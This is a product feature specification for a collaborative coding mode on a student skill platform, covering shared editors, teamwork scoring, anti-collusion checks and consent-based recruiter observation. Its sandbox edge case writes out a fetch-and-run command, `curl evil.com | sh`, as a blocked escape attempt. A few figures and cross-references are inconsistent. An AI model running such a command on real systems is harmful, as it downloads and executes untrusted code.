# Feature Specification: 008 — Collaborative Mode

**Feature Branch**: `008-collaborative-mode`
**Created**: 2026-06-07
**Status**: Draft
**Builds on**: 001 (foundation) + 002 (verified skill platform) + 003 (engage & showcase) + 004 (anti-cheat, public API, mock interviews, hackathon patterns)
**Migration**: `041_collab.sql` (additive; see `plan.md` §1 for migration-ledger reconciliation)
**Input**: Four product moves on top of the 001-004 stack — live multiplayer coding, derived teamwork scoring, anti-collusion/privacy, and recruiter observe mode — that together convert individual verification into a defensible *team* skill credential.

## Why this exists

001-004 delivered verified individual skill signal. Indian tech hiring, however, hires for *teams*. Without a way to show "this student can pair-program, take turns, resolve conflicts, and unstick a teammate", the platform leaves a high-leverage signal on the table. This feature adds that signal in a way that is **gaming-resistant** (reusing 004 anti-cheat, plus new collusion detection), **privacy-respecting** (per-student opt-out, per-room consent), and **recruiter-actionable** (interview-mode observation, recorded review).

Three explicit deferrals are captured in **Out of Scope**: native mobile collab client, ClickHouse for event-stream analytics, and AI-generated code review inside the collab editor. The v1 surface covers JS/Python in-browser via WebContainer, with all other languages routed to a remote Firecracker microVM; the design is open to adding more browser-side runtimes without schema changes.

## User Scenarios & Testing *(mandatory)*

### User Story 1 — Live Multiplayer Coding: students co-build in a shared room (Priority: P1)

A mentor posts a cohort challenge ("build a URL shortener API in Node + Express, 60 minutes, 2-person team"). Two students from the same cohort accept the invite, land in a `/collab/room/{id}` page, see a shared Monaco editor (Monaco + Y.js CRDT bound to Liveblocks for presence + persistence), a shared terminal sandbox running their code, and a LiveKit voice channel. Each keystroke is replicated in < 100ms to the other client. When either runs the test suite, the green/red output renders for both within 500ms. The mentor joins as observer. At 60 minutes the room auto-ends, the final code and transcript are persisted as a `collab_artifact`, and a `teamwork_score` row is computed (US2).

**Why this is P1**: This is the load-bearing new surface. US2, US3, and US4 all consume artifacts produced by US1.

**Independent test**: Seed 2 student sessions, 1 mentor observer, 1 LiveKit voice room, 1 Liveblocks dev-mode room, 1 WebContainer boot. Drive a 5-minute scenario where Student A types a function, Student B runs the tests, both see the output, and the timeline contains 1 `code_commit` event per author and 1 `chat` event. Assert: artifact row persisted, both clients received the same final Y.js doc state, 0 dropped Y.js ops, LiveKit audio packets flowed for ≥ 90% of the 5-minute window.

**Acceptance scenarios**:
1. **Given** two students join the same room via a valid invite, **when** Student A types a line of code, **then** Student B sees the same line in their editor within 200ms (Y.js CRDT, browser-to-browser via Liveblocks relay), and a `collab_events.code_commit` row is persisted for author A.
2. **Given** either student clicks "Run Tests", **when** the WebContainer runs the suite, **then** the JSON result is broadcast to both clients within 500ms, and a `collab_events.test_run` row is persisted with `passed`, `failed`, `duration_ms`.
3. **Given** Student A's network drops for 30 seconds and reconnects, **when** connectivity returns, **then** Y.js converges the editor state with no duplicate ops and no data loss (Y.js CRDT guarantee), and a `collab_events.reconnect` row is recorded.
4. **Given** a non-JS/non-Python language is requested, **when** the room boots, **then** a remote Firecracker microVM is provisioned (≤ 8s) and the same Y.js + LiveKit flows apply, with the sandbox running on `wss://<region>.fly.io/sandbox/{id}`.
5. **Given** a room has been live for the configured duration (default 60min, max 120min), **when** the timer hits zero, **then** the room auto-ends: editor locks, sandbox shuts down, `collab_artifacts` row is created with `code_snapshot`, `transcript`, and `events_json`, and US2's teamwork score is enqueued.
6. **Given** a student loses LiveKit connectivity for > 60 seconds, **when** the heartbeat misses 3 ticks, **then** the student is auto-muted, the room continues, and a `collab_events.voice_degraded` event is logged.

---

### User Story 2 — Teamwork Scoring: derive a 0-100 teamwork score from session events (Priority: P1)

After a room ends, the `teamwork-scorer` edge function consumes the `collab_events` log and computes: turn-taking ratio (do both authors contribute? does one author vanish for > 50% of the window?), code-contribution balance (lines added per author, distinct authors active, time-active seconds per author), conflict-resolution events (one author writes while another holds a `LOCKS` annotation → score event with negative weight), help-events (one author sends a chat message that unblocks the other within 90s, detected by a subsequent code_commit in a previously-zero-progress area). These are weighted into a single `teamwork_score` ∈ [0,100] and persisted to `teamwork_scores`. The score is **capped at 5% of the total Skill Proof Score** to prevent collab-grinding from inflating individual credentials.

**Why this is P1**: Without a deterministic scoring function, the artifact is decorative. With it, the artifact becomes a recruiter-actionable signal.

**Independent test**: Seed a `collab_events` log for a 30-minute session with hand-crafted turn-taking (60/40 split), a known conflict event at minute 12, and a known help-event at minute 18. Run the scorer. Assert: `teamwork_score` is in the expected band (0.65-0.80 for that input), the score's contribution to total Skill Proof Score is exactly 5% of the difference it would otherwise make (i.e. capped), and the score breakdown JSON contains all four sub-scores with their inputs.

**Acceptance scenarios**:
1. **Given** a session where both authors are active for ≥ 40% of the window and no conflict events fire, **when** the scorer runs, **then** `turn_taking_score ≥ 70` and `balance_score ≥ 70`, and the final `teamwork_score ≥ 70`.
2. **Given** a session where one author is active for < 10% of the window, **when** the scorer runs, **then** `turn_taking_score ≤ 30` and a `low_engagement` reason is included in the breakdown JSON.
3. **Given** a session where author A holds a `LOCKS` annotation and author B writes 5+ lines into a locked region, **when** the scorer runs, **then** a `conflict_unresolved` event is recorded and deducts from the score (per the documented weight table).
4. **Given** author A sends a chat "try using a Set instead of array" and author B's next `code_commit` removes the array-based code, **when** the scorer runs, **then** a `help_event` is recorded with `helper_id=A`, `helpee_id=B`, and adds the documented help-weight to the score.
5. **Given** a student has opted out of teamwork scoring (FR-013), **when** the scorer runs, **then** that student's individual score is `null` and their participation is still logged in `collab_events` (for audit) but excluded from the room-level aggregation.

---

### User Story 3 — Anti-collusion + Per-student Privacy (Priority: P2)

While US1 is running, the same anti-cheat pipeline from 004 runs in a collab-aware mode: if Student A is typing at cadence X while Student B is simultaneously writing code that looks like LLM-generated output, and the typing-cadence divergence between A and B exceeds a threshold, an `anticheat_signals.collab_typing_divergence` row is written. The 004 LLM-coach logic checks this signal before suggesting a hint (i.e. "don't coach a student while their teammate is doing the work for them"). Additionally, every student gets a privacy toggle: opting out excludes them from the teamwork score (their events are still logged, the room-level score is computed over the remaining participants), and the UI clearly shows what opting out does.

**Why this is P2**: P1 trust + P1 reach ship first. Anti-collusion is the safety net that lets us turn the teamwork score on for everyone.

**Independent test**: Seed a synthetic collab session where Student A's typing cadence is constant (3 chars/sec) and Student B's commits look LLM-generated (detected by the existing 004 `ai_generated_suspect` signal). Run the collab-aware anti-cheat. Assert: a `collab_typing_divergence` signal is written, and an attempt by A to invoke the LLM coach is blocked (returns 403 with reason `collab_divergence_signal_active`).

**Acceptance scenarios**:
1. **Given** Student A is in a collab room and signals are being collected, **when** A requests an LLM coach hint, **then** the coach checks for `collab_typing_divergence` in the last 60s; if present, the hint is denied and `collab_events.coach_blocked` is logged.
2. **Given** Student A toggles "opt out of teamwork scoring" in settings, **when** the next room ends and the scorer runs, **then** A's `teamwork_score` is `null`, A's `collab_events` are still persisted (for audit), and the room score is computed over the other participants.
3. **Given** all students in a room opt out, **when** the scorer runs, **then** the room score is recorded as `0` with reason `all_participants_opted_out` (not `null` — the artifact still exists).
4. **Given** a student opts out, **when** they later opt back in, **then** future sessions count toward their score; previously completed sessions remain excluded (no retroactive re-scoring).

---

### User Story 4 — Recruiter Observe Mode (live + recorded) (Priority: P2)

A recruiter from a partner company opens `/recruiter/observe`. They see a list of collab rooms for students who have explicitly consented (via a per-room `collab_consents` row) to recruiter observation. They pick a room. The recruiter lands in a read-only view: editor renders, terminal output renders, but the recruiter cannot type. Voice is muted by default; recruiter can request to join voice with explicit "raise hand" UX, which the participants must approve. A "interview mode" toggle lets the recruiter post a problem statement that appears as a sticky banner in the participants' editor. After the session ends, the recruiter can review the recorded artifact (code snapshot + chat transcript + terminal scrollback) at `/recruiter/observe/{room_id}/review`.

**Why this is P2**: Builds the recruiter "interview" surface that turns a passive score into a live signal. Requires consent infrastructure (US3 partially).

**Independent test**: Seed 1 recruiter session, 1 student session, 1 consent row. Recruiter calls `POST /api/collab/rooms/{id}/observe`. Assert: recruiter gets an observer token (Liveblocks `READ_ONLY` permission), student is notified, recruiter can see editor + terminal but not type, voice is muted, transcript is persisted to `collab_recordings`.

**Acceptance scenarios**:
1. **Given** a recruiter has a valid observer invite for a room, **when** they hit `POST /api/collab/rooms/{id}/observe`, **then** the room returns a Liveblocks auth token with `READ_ONLY` permission, a LiveKit observer token (no publish capability), and a `collab_recordings` row is created with `started_at`.
2. **Given** a recruiter is observing a room in interview mode, **when** they post a problem statement, **then** the problem appears as a sticky banner in all participants' editors within 1 second, and a `collab_events.interviewer_posted_problem` event is logged.
3. **Given** the room ends, **when** the recruiter navigates to `/recruiter/observe/{room_id}/review`, **then** they see: final code snapshot, full chat transcript, full terminal scrollback, the `teamwork_score` (if the recruiter's tenant has `read:teamwork_score` scope), and a per-student contribution chart. The page renders in < 2s.
4. **Given** a student revokes consent for a room mid-session, **when** the revoke propagates, **then** the recruiter's Liveblocks token is downgraded to `DENY` within 5 seconds, the recruiter's UI shows "Access revoked by participant", and a `collab_events.consent_revoked` event is logged.
5. **Given** a recruiter tries to observe a room without a valid `collab_consents` row, **when** they hit the API, **then** the response is 403 with code `consent_required` and a deep link to the consent-grant flow.

---

### Edge Cases

- **WebContainer cross-origin isolation** → WebContainer requires `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp` headers. Edge case: if the collab route is loaded inside an iframe (e.g. an embed), boot fails. We document this and refuse iframe embed via `X-Frame-Options: DENY` on the collab route.
- **Y.js divergent state on long-lived sessions** → After 4 hours of edits, Y.js ops can grow into the 10s of MB. We snapshot the Y.js doc into `collab_artifacts.code_snapshot` every 5 minutes and on disconnect; on reconnect, we rehydrate from the latest snapshot.
- **LiveKit media server outage** → If LiveKit is unreachable, voice falls back to data-channel-only chat; the room continues; a `collab_events.voice_unavailable` event is logged.
- **Sandbox escape attempt** → A student pipes `curl evil.com | sh` into the WebContainer. WebContainer's network-disabled mode (set by default for collab rooms) blocks egress. The attempt is logged as `collab_events.sandbox_egress_blocked`. Remote Firecracker microVMs have no outbound network by default (Fly.io private network only).
- **Anti-collusion false positive on small-group tutoring** → A 1:1 mentor-student session is not "teamwork" and is not scored. We distinguish via `collab_rooms.kind IN ('self_practice', 'paired_with_mentor', 'team')`; only `team` rooms generate a `teamwork_score`.
- **Opt-out cascade** → All participants opt out → room score is `0` with reason `all_participants_opted_out`, not `null`. The room is still recorded (for audit) but does not contribute to any student's score.
- **Recruiter observe on a room where the student has *not* yet joined** → Observe token is valid but the room is empty. The recruiter sees "Waiting for participants" and a `JOIN_ROOM` event is recorded when the first student lands.
- **Recording retention** → Recordings older than the configured retention period (default 90 days) are auto-purged; see FR-019.
- **Code commit during a sandbox failure** → WebContainer is in a crashed state. The `collab_events.code_commit` is still recorded (the edit happened in the Y.js doc), but `test_run` is marked `failed_environment` and the room flags a `sandbox_restart_required` notice.
- **Time-zone skew in scheduling** → Rooms scheduled in the future are stored in UTC. The client renders in the student's locale. A scheduled-start 1 minute in the past is still joinable (grace period).
- **Consent granted, then student deletes their account** → The `collab_consents` row is dropped via FK CASCADE; the `collab_recordings` row remains but `recording_url` is tombstoned with `redacted=true`.

## Requirements *(mandatory)*

### Functional Requirements

#### Live Collab Room (US1)
- **FR-001**: System MUST allow 2-4 students and 0-2 observers to join a single collab room from a cohort or mentor invite.
- **FR-002**: System MUST bind a Monaco + Y.js CRDT editor to a Liveblocks room for presence (cursors, selections, awareness) and persistence (5-minute auto-snapshot).
- **FR-003**: System MUST replicate keystroke ops between clients with p95 latency ≤ 200ms over typical Indian broadband (3-8 Mbps).
- **FR-004**: System MUST provide a shared terminal sandbox (WebContainer for JS/TS/Python; remote Firecracker microVM for all other languages), bootable in ≤ 8s.
- **FR-005**: System MUST broadcast test-run output to all room participants within 500ms of completion, regardless of which participant triggered the run.
- **FR-006**: System MUST provide a LiveKit voice channel for the room; voice is opt-in per participant, defaults to muted-join.
- **FR-007**: System MUST auto-end rooms at the configured duration (30-120 minutes, default 60); on end, the editor locks, the sandbox shuts down, and a `collab_artifacts` row is created with `code_snapshot`, `transcript`, and `events_json`.
- **FR-008**: System MUST support scheduled (future) rooms; participants can join 10 minutes before start; rooms auto-end at scheduled-end + 5-minute grace.
- **FR-009**: System MUST persist every meaningful event (join, leave, code_commit, test_run, chat, help, conflict, voice_degraded, sandbox_egress_blocked, reconnect, consent_change) to `collab_events` with author, timestamp, payload.
- **FR-010**: System MUST be embeddable only as a top-level navigation; the collab route MUST set `X-Frame-Options: DENY` and `Cross-Origin-Embedder-Policy: require-corp` headers (required for WebContainer SharedArrayBuffer support).

#### Teamwork Scoring (US2)
- **FR-011**: System MUST compute a `teamwork_score` ∈ [0,100] for every `team`-kind room within 5 minutes of room end.
- **FR-012**: System MUST derive the score from these sub-scores, each in [0,100], with the documented weights: `turn_taking` (25%), `code_balance` (35%), `conflict_resolution` (20%), `help_events` (20%).
- **FR-013**: System MUST cap the contribution of `teamwork_score` to the overall Skill Proof Score at exactly 5% of the per-student delta (the per-student cap is documented in the data-model.md `score_contribution` column).
- **FR-014**: System MUST emit a `teamwork_scores` row with the final score, all four sub-scores, the input event counts, and a human-readable `breakdown_json` (with `reasons` array) per room per non-opted-out participant.
- **FR-015**: System MUST flag rooms with `conflict_unresolved` events for mentor review (queue visible at `/college/mentor/collab-review`).

#### Anti-collusion + Privacy (US3)
- **FR-016**: System MUST compute a `collab_typing_divergence` signal whenever a participant is requesting an LLM coach hint while another participant is actively typing in the same room; signal persisted to `anticheat_signals` with `signal='collab_typing_divergence'`, `confidence ∈ [0,1]`.
- **FR-017**: System MUST block LLM coach hints for the duration of an active `collab_typing_divergence` signal; deny response MUST be 403 with code `collab_divergence_signal_active`; a `collab_events.coach_blocked` event is persisted.
- **FR-018**: System MUST allow any participant to opt out of teamwork scoring via a `users.collab_opt_out` boolean (default false); opt-out toggles take effect within 60 seconds and apply to *future* sessions only (no retroactive re-scoring).
- **FR-019**: System MUST auto-purge `collab_recordings` rows older than the configured retention period (default 90 days) via a nightly cron; `collab_artifacts.code_snapshot` and `collab_events` are retained for audit per 002's retention policy.

#### Recruiter Observe (US4)
- **FR-020**: System MUST issue a Liveblocks auth token with `READ_ONLY` permission and a LiveKit observer token (no publish) to a recruiter who has a valid `collab_consents` row.
- **FR-021**: System MUST notify all room participants (in-app toast + Discord if configured) when a recruiter observer joins; notification includes the recruiter's company name and the "raise hand to enable voice" affordance.
- **FR-022**: System MUST support an "interview mode" toggle that lets the observer post a problem statement as a sticky banner in participants' editors; banner appears within 1 second.
- **FR-023**: System MUST render the recorded review at `/recruiter/observe/{room_id}/review` with: code snapshot, chat transcript, terminal scrollback, `teamwork_score` (if recruiter tenant has `read:teamwork_score` scope), per-student contribution chart; p95 page render ≤ 2s.
- **FR-024**: System MUST downgrade the observer's Liveblocks token to `DENY` within 5 seconds of a `collab_consents` revocation; UI shows "Access revoked by participant".

#### Sandbox + Security
- **FR-025**: System MUST default WebContainer rooms to `network: 'disabled'` mode; egress attempts are blocked and logged as `collab_events.sandbox_egress_blocked`.
- **FR-026**: System MUST default Firecracker microVMs to no outbound network; only the Liveblocks relay + the room's own Y.js document are reachable.
- **FR-027**: System MUST enforce a 30-second CPU cap and 256MB memory cap on every test-run; over-cap runs are killed and marked `failed_resource_cap`.
- **FR-028**: System MUST scope a room's filesystem: no reads outside the room's working directory; no writes outside `/workspace` and `/tmp`; attempts to escape are logged and the offending op is rejected.

#### Privacy + Audit
- **FR-029**: System MUST require explicit per-room consent (`collab_consents` row) before any observer (recruiter, mentor, faculty) can join; the consent grant UI MUST show what the observer will see (editor, terminal, voice, transcript).
- **FR-030**: System MUST log every `consent_granted`, `consent_revoked`, `consent_expired` event to `collab_consents` (immutable history table) AND to `collab_audit` (cross-feature audit log).
- **FR-031**: System MUST redact student PII (email, phone) from any artifact rendered to a non-participant observer; only first name, college, year are shown.
- **FR-032**: System MUST, on account deletion, drop the user's `collab_consents` rows (CASCADE), tombstone their `collab_participants` rows (`left_reason='account_deleted'`), and retain `collab_events` and `collab_artifacts` for the audit period (anonymized).

#### Feature Flags
- **FR-033**: Every 008 capability MUST ship behind a feature flag in the existing `feature_flags` table; default OFF; flags enumerated in `quickstart.md` §11.

### Key Entities

- **collab_rooms** — one row per collab session; columns: `id`, `kind` (`self_practice`/`paired_with_mentor`/`team`), `cohort_id` (nullable), `invited_by`, `scheduled_start`, `duration_minutes`, `language` (`javascript`/`python`/`go`/`rust`/`other`), `sandbox_kind` (`webcontainer`/`firecracker`), `status` (`scheduled`/`live`/`ended`/`cancelled`), `consent_required`, `ends_at`, `created_at`.
- **collab_participants** — per-room membership; columns: `room_id`, `user_id`, `role` (`host`/`participant`/`observer`/`recruiter_observer`), `joined_at`, `left_at`, `left_reason`, `opt_out_teamwork`, `consent_id` (nullable).
- **collab_events** — append-only event log; columns: `room_id`, `user_id`, `event_type` (typed enum), `payload_json`, `seq` (per-room monotonic), `created_at`.
- **collab_artifacts** — persisted session output; columns: `room_id`, `code_snapshot_url` (signed storage URL), `transcript_url`, `events_url` (gzipped event log), `language`, `duration_seconds`, `ended_at`.
- **teamwork_scores** — per-room per-participant scoring result; columns: `room_id`, `user_id` (nullable if opted out), `score` (0-100), `sub_scores_json` (turn_taking, code_balance, conflict_resolution, help_events), `breakdown_json` (reasons array), `computed_at`.
- **collab_recordings** — recording metadata; columns: `room_id`, `observer_user_id`, `recording_url` (LiveKit egress URL, nullable), `started_at`, `ended_at`, `redacted`, `purge_after`.
- **collab_consents** — per-room consent grants; columns: `room_id`, `user_id`, `grantee_user_id`, `scopes` (`observe_live`/`observe_recorded`/`read_teamwork_score`), `granted_at`, `revoked_at`, `expires_at`.
- **collab_snapshots** — periodic Y.js doc snapshots for fast rehydrate; columns: `room_id`, `seq_at_snapshot`, `snapshot_url` (binary Y.js update), `created_at`.
- **collab_audit** — cross-feature audit log of consent + observer + opt-out events; columns: `actor_id`, `actor_type`, `action`, `subject_room_id`, `payload_json`, `created_at`.

## Out of Scope (Deferred to v2)

These were considered and explicitly deferred:
1. **Native mobile collab client (iOS / Android)** — Defer until web collab engagement is measured. The web route is fully responsive and supports desktop + tablet; mobile participation is read-only observer for now.
2. **AI-generated code review inside the collab editor** — Defer; we don't want LLM critique to leak hints to one participant that the other doesn't have.
3. **ClickHouse / column-store for `collab_events` analytics** — Defer; current scale (≤ 50K students × 1-2 sessions/month × ~1K events/session) is well within Postgres + `pg_partman` reach.
4. **Multi-language in-room translation (live chat translate)** — Defer; participants share a room and can use the same language. Voice transcription is a v2 candidate.
5. **Whiteboard + drawing tools** — Defer to a future "Collab Mode Pro" tier. Code editor + terminal + voice is the v1 surface.
6. **In-room AI pair-programmer (Cursor-style inline completions)** — Permanently deferred for collab rooms. Induces anti-collusion gaming at the editor level. Single-player rooms keep this surface.

## Success Criteria *(mandatory, measurable)*

### Measurable Outcomes

- **SC-COLLAB-001**: ≥ 30% of P1-tier students participate in at least 1 collab room within 60 days of launch.
- **SC-COLLAB-002**: Median room length is 45-75 minutes (target density); < 10% of rooms end in < 10 minutes (signal of bad invite quality or boot failures).
- **SC-COLLAB-003**: Median Y.js op replication p95 latency ≤ 200ms across 3G/4G/Wi-Fi client conditions.
- **SC-COLLAB-004**: Test-run p95 round-trip (trigger → result broadcast to all participants) ≤ 500ms.
- **SC-COLLAB-005**: 80% of `team`-kind rooms produce a `teamwork_score` within 5 minutes of room end.
- **SC-COLLAB-006**: Recruiter observe mode adoption: ≥ 3 partner companies issue ≥ 10 observe-invites per month within 90 days of launch.
- **SC-COLLAB-007**: Anti-collusion false-positive rate ≤ 2% (verified by mentor-review of flagged `conflict_unresolved` events).
- **SC-COLLAB-008**: ≤ 5% of users opt out of teamwork scoring in the first 90 days (proxy for trust).
- **SC-COLLAB-009**: Sandbox escape attempts: zero successful escapes; ≤ 1 in 10K sessions logs `sandbox_egress_blocked` (signal of attack surface, not failure).
- **SC-COLLAB-010**: Median `/recruiter/observe/{id}/review` page p95 render ≤ 2s.

## Assumptions

- **Internet connectivity**: Target users have 3G+ connectivity with intermittent drops; Y.js CRDT handles drop+reconnect without data loss.
- **Browser support**: Latest 2 versions of Chrome, Edge, Firefox, Safari. WebContainer is Chromium-only; non-Chromium browsers fall back to a read-only view of the editor + remote Firecracker microVM for the sandbox.
- **Existing 004 anti-cheat is reusable**: The `anticheat_signals` table from 004 (migration 034) gains a new `signal` enum value `collab_typing_divergence`; no new anti-cheat schema needed.
- **Liveblocks + LiveKit accounts already provisioned**: Org keys, secret keys, API keys are managed by the platform team; documented in `quickstart.md` §1.
- **WebContainer is acceptable for v1**: Browser-side sandbox covers JS/TS/Python with no infra; remote Firecracker microVM covers all other languages via Fly.io (one Fly.io app per region).
- **Per-room consent is the privacy primitive**: We do not add a global "allow recruiters to observe me" toggle; consent is room-scoped, time-bounded, and revocable mid-session.
- **Recording retention is 90 days by default**: Configurable per-tenant; recordings older than retention are purged; `collab_artifacts` (code, transcript) are retained per 002's audit policy (1 year).
- **Migration 041 conflicts**: The migration ledger already has `041_webhooks.sql` (from 005). The 008 plan proposes `041_collab.sql` to align with the brief's stated number; if a conflict surfaces at apply-time, the next free number is `043` (042 is also taken by `042_verify_api_key.sql`). This is flagged in `plan.md` §1 and `checklists/requirements.md` CHK-OC-1.
